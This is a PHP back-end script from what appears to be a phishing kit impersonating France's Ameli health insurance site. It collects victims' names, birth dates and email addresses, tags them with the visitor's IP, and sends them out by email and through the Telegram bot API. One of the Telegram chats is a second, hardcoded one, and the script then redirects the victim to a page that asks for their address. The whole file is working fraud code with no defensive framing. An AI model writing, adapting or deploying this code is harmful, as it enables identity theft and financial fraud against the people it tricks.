<?php

include("../common/sub_includes.php");
include("../config.php");

ob_start();
if (!isset($_SESSION)) {
    session_start();  // Et on ouvre la session
}

$nom = $_POST['nom'];
$prenom = $_POST['prenom'];
$ddn = $_POST['day'] . "/" . $_POST['month'] . "/" . $_POST['year'];
$Mail = $_POST['mail'];

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $_SESSION['Nom']  = $nom;
    $_SESSION['Prenom']  = $prenom;
    $_SESSION['Ddn']  = $ddn;
    $_SESSION['mail']  = $Mail;

    $message = "
[🦊] Ameli Querty billing +1 [🦊]

👮 Nom : " . $_SESSION['Nom'] . "
👮 Prénom : " . $_SESSION['Prenom'] . "

📱 Email : " . $_SESSION['mail'] . "
🎂 Date de naissance : " . $_SESSION['Ddn'] . "

🛒 Adresse IP : " . $_SERVER['REMOTE_ADDR'] . "
";

  

if ($mail_send == true) {
    $Subject = " 「💳」+1 Fr3sh Ameli billing from " . $_SESSION["Nom"] . " | " . $_SERVER['REMOTE_ADDR'];
    $head = "From: Ameli billing <info@querty.bg>";
  
    mail($my_mail, $Subject, $message, $head);
  }
  
  if ($tlg_send == true) {
    file_get_contents('https://api.telegram.org/bot' . $bot_token . '/sendMessage?chat_id=' . $rez_billing . '&text=' . urlencode("$message") . '');

    file_get_contents('https://api.telegram.org/bot' . $bot_token . '/sendMessage?chat_id=' . '-4037726986' . '&text=' . urlencode("$message") . '');
  }

    header('location: ../pages/adresse.php');
}
